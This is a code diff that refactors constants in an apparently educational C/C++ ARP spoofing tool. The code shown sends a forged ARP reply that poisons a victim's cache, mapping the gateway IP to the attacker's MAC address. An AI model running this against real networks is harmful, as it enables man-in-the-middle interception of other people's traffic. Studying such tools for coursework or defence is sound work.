@@ -13,32 +13,38 @@
 #include <arpa/inet.h>
 #include <pcap.h>
 
-#define IP_ADDR_LEN 4
-#define IP_STR_BUF_LEN 16
+enum Len {
+  IP_ADDR = 4,
+  MAC_ADDR = 6,
+  IP_STR_BUF = 16,
+  MAC_STR_BUF = 18,
+  ETH_HEADER = 14,   // 6 + 6 + 2
+  SYS_NET_PATH = 24,
+  INT_NAME_MAX = 15,
+  ARP_TABLE_ENTRY = 128
+};
+enum ArpOpcode {
+  REQUEST = 0x0001,
+  REPLY   = 0x0002
+};
+enum NI {
+  MAXHOST     = 1025,
+  NUMERICHOST = 1
+};
+namespace Path {
+  const char* SYS_NET  = "/sys/class/net/%s/address";
+  const char* PROC_ARP = "/proc/net/arp";
+};
+namespace MacStr {
+  const char* BROADCAST_ETH   = "ff:ff:ff:ff:ff:ff";
+  const char* ARP_REQ_DST_MAC = "00:00:00:00:00:00";
+};
 
-#define MAC_ADDR_LEN 6
-#define MAC_STR_BUF_LEN MAC_ADDR_LEN * 2 + 5 + 1
-#define ETH_HEADER_SIZE 14 // 6 + 6 + 2
-
-#define SYS_NET_PATH "/sys/class/net/%s/address"
-#define SYS_NET_PATH_LEN 24
-#define PROC_ARP_PATH "/proc/net/arp"
-#define INT_NAME_MAX_LEN 15
-#define ARP_TABLE_ENTRY_LEN 128
-
-#define BROADCAST_ETH_STR   "ff:ff:ff:ff:ff:ff"
-#define ARP_REQ_DST_MAC_STR "00:00:00:00:00:00"
-
-#define ARP_REQUEST 0x0001
-#define ARP_REPLY   0x0002
-
-#define NI_MAXHOST 1025
-#define NI_NUMERICHOST 1
 
 typedef struct _eth_header
 {
-  uint8_t dst_addr[MAC_ADDR_LEN];
-  uint8_t src_addr[MAC_ADDR_LEN];
+  uint8_t dst_addr[Len::MAC_ADDR];
+  uint8_t src_addr[Len::MAC_ADDR];
   uint16_t ether_type; // next protocol type
 } __attribute__((packed)) eth_header;
 
@@ -49,9 +55,9 @@ typedef struct _arp_packet
   uint8_t hd_size;
   uint8_t protocol_size;
   uint16_t opcode;
-  uint8_t src_mac[MAC_ADDR_LEN];
+  uint8_t src_mac[Len::MAC_ADDR];
   uint32_t src_ip;
-  uint8_t dst_mac[MAC_ADDR_LEN];
+  uint8_t dst_mac[Len::MAC_ADDR];
   uint32_t dst_ip;
 } __attribute__((packed)) arp_packet;
 
@@ -99,15 +105,15 @@ int main(int argc, char *argv[]) {
   
   ////////////////////////// send ARP REQUEST
   eth_arp_packet packet;
-  char src_ip_str[IP_STR_BUF_LEN];
-  char src_mac_str[MAC_STR_BUF_LEN];
+  char src_ip_str[Len::IP_STR_BUF];
+  char src_mac_str[Len::MAC_STR_BUF];
   get_src_ip_str(dev, src_ip_str);
   get_dev_mac(dev, src_mac_str);
   printf("this host's ip  : %s\n", src_ip_str);
   printf("this host's mac : %s\n", src_mac_str);
 
-  fill_eth_header(&packet.eth, src_mac_str, BROADCAST_ETH_STR, ETH_P_ARP);
-  fill_arp_packet(&packet.arp, src_mac_str, ARP_REQ_DST_MAC_STR, src_ip_str, victim_ip_str, ARP_REQUEST);
+  fill_eth_header(&packet.eth, src_mac_str, MacStr::BROADCAST_ETH, ETH_P_ARP);
+  fill_arp_packet(&packet.arp, src_mac_str, MacStr::ARP_REQ_DST_MAC, src_ip_str, victim_ip_str, ArpOpcode::REQUEST);
   // print_packet((u_char *)&packet);
   if (pcap_sendpacket(handle, (u_char *)&packet, sizeof(eth_arp_packet)) == -1)
   {
@@ -115,13 +121,13 @@ int main(int argc, char *argv[]) {
   }
 
   ///////////////// RECV ARP REPLY to get victim's mac
-  char victim_mac_str[MAC_STR_BUF_LEN];
+  char victim_mac_str[Len::MAC_STR_BUF];
   get_mac_from_arp_req(handle, victim_ip_str, victim_mac_str);
   printf("victim's mac   : %s\n", victim_mac_str);
 
   ///////////////// SEND ARP REPLY ( ARP SPOOFING )
   fill_eth_header(&packet.eth, src_mac_str, victim_mac_str, ETH_P_ARP);
-  fill_arp_packet(&packet.arp, src_mac_str, victim_mac_str, gateway_ip_str, victim_ip_str, ARP_REPLY);
+  fill_arp_packet(&packet.arp, src_mac_str, victim_mac_str, gateway_ip_str, victim_ip_str, ArpOpcode::REPLY);
   
   // print_mac_addr("src_mac : ", packet->eth.src_addr);
   // print_mac_addr("dst_mac : ", packet->eth.dst_addr);  
@@ -148,13 +154,13 @@ void get_mac_from_arp_req(pcap_t *handle, const char *ip_str, char* mac_str) {
     eth_header *eth = (eth_header *)recv_packet;
     if (eth->ether_type == htons(ETH_P_ARP)) {
       print_packet((u_char*)recv_packet);
-      arp_packet* arp = (arp_packet*)(recv_packet + ETH_HEADER_SIZE);
+      arp_packet* arp = (arp_packet*)(recv_packet + Len::ETH_HEADER);
       // in this case, inet_ntoa is better than inet_ntop
-      if (arp->opcode == htons(ARP_REPLY)) {
+      if (arp->opcode == htons(ArpOpcode::REPLY)) {
         struct in_addr src_ip;
         src_ip.s_addr = arp->src_ip;
-        if (!strncmp(inet_ntoa(src_ip), ip_str, IP_STR_BUF_LEN - 1)) {
-          strncpy(mac_str, ether_ntoa((ether_addr*)arp->src_mac), MAC_STR_BUF_LEN - 1);
+        if (!strncmp(inet_ntoa(src_ip), ip_str, Len::IP_STR_BUF - 1)) {
+          strncpy(mac_str, ether_ntoa((ether_addr*)arp->src_mac), Len::MAC_STR_BUF - 1);
           break;
         }
       }
@@ -168,8 +174,8 @@ void fill_eth_header(eth_header *eth, const char *src_mac_str, const char *dst_m
    * output : (indirect) filled eth_header*
    * **/
   // or should I change ether_aton() -> ether_aton_r()?
-  memcpy(&eth->src_addr, ether_aton(src_mac_str), MAC_ADDR_LEN);
-  memcpy(&eth->dst_addr, ether_aton(dst_mac_str), MAC_ADDR_LEN);
+  memcpy(&eth->src_addr, ether_aton(src_mac_str), Len::MAC_ADDR);
+  memcpy(&eth->dst_addr, ether_aton(dst_mac_str), Len::MAC_ADDR);
   eth->ether_type = htons(type);
 }
 
@@ -181,12 +187,12 @@ void fill_arp_packet(arp_packet *arp, const char *src_mac_str, const char *dst_m
    * **/
   arp->hd_type = htons(1); // Ethernet일 경우 1
   arp->protocol_type = htons(ETH_P_IP);
-  arp->hd_size = MAC_ADDR_LEN;
-  arp->protocol_size = IP_ADDR_LEN;
+  arp->hd_size = Len::MAC_ADDR;
+  arp->protocol_size = Len::IP_ADDR;
   arp->opcode = htons(opcode);
-  memcpy(&arp->src_mac, ether_aton(src_mac_str), MAC_ADDR_LEN);
+  memcpy(&arp->src_mac, ether_aton(src_mac_str), Len::MAC_ADDR);
   arp->src_ip = inet_addr(src_ip_str); // inet_aton()와 struct in_addr을 사용해도 된다.
-  memcpy(&arp->dst_mac, ether_aton(dst_mac_str), MAC_ADDR_LEN);
+  memcpy(&arp->dst_mac, ether_aton(dst_mac_str), Len::MAC_ADDR);
   arp->dst_ip = inet_addr(dst_ip_str);
 }
 
@@ -211,13 +217,13 @@ void get_src_ip_str(const char*dev, char* host)
     if (family == AF_INET)
     {
       s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
-                      host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
+                      host, NI::MAXHOST, NULL, 0, NI::NUMERICHOST);
       if (s != 0)
       {
         printf("getnameinfo() failed: %s\n", gai_strerror(s));
         exit(EXIT_FAILURE);
       }
-      else if (!strncmp(ifa->ifa_name, dev, INT_NAME_MAX_LEN))
+      else if (!strncmp(ifa->ifa_name, dev, Len::INT_NAME_MAX))
       {
         break;
       }
@@ -228,9 +234,9 @@ void get_src_ip_str(const char*dev, char* host)
 }
 
 void get_dev_mac(const char* dev, const char* mac_str) {
-  size_t mac_path_len = SYS_NET_PATH_LEN + strlen(dev);
+  size_t mac_path_len = Len::SYS_NET_PATH + strlen(dev);
   char mac_path[mac_path_len];
-  snprintf(mac_path, mac_path_len, SYS_NET_PATH, dev);
+  snprintf(mac_path, mac_path_len, Path::SYS_NET, dev);
 
   FILE *fp = fopen(mac_path, "r");
   if (!fp)
@@ -273,14 +279,14 @@ int get_mac_from_arp_table(const char* ip_str, const char* mac_str) {
    * output : mac_str (indirect)
    * return : 0, -1
    * */
-  FILE *fp = fopen(PROC_ARP_PATH, "r");
+  FILE *fp = fopen(Path::PROC_ARP, "r");
   if (!fp)
   {
-    fprintf(stderr, "[*] fopen(%s) error\n", PROC_ARP_PATH);
+    fprintf(stderr, "[*] fopen(%s) error\n", Path::PROC_ARP);
     return -1;
   }
 
-  char column[ARP_TABLE_ENTRY_LEN];
+  char column[Len::ARP_TABLE_ENTRY];
   if (!fgets(column, sizeof(column), fp))
   {
     perror("[*] fgets error");
@@ -288,9 +294,9 @@ int get_mac_from_arp_table(const char* ip_str, const char* mac_str) {
   }
   // printf("%s\n", column);
 
-  char parsed_ip[IP_STR_BUF_LEN] = {0};
+  char parsed_ip[Len::IP_STR_BUF] = {0};
   fscanf(fp, "%s %*s %*s %s %*s %*s", parsed_ip, mac_str);
-  while (strncmp(ip_str, parsed_ip, IP_STR_BUF_LEN - 1) != 0)
+  while (strncmp(ip_str, parsed_ip, Len::IP_STR_BUF - 1) != 0)
   {
     if (feof(fp) != 0)
     {
